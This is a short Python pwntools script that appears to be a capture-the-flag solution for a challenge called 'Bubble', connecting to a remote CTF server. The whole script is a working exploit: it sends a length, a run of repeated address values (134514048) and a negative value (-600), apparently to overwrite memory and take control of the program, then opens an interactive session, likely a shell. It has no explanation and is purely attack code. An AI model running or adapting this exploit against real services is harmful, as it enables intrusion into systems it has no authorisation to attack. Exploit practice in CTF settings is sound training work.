from pwn import *

#r = process(["./Bubble"])
r = remote("csie.ctf.tw",10121)
r.recvuntil(":",drop=True)
r.sendline("%d"%(4*18))
r.recvuntil(":",drop=True)
r.sendline("134514048 "*(4*18))
r.recvuntil(":",drop=True)
r.sendline("-600")
r.recvline()
r.interactive()
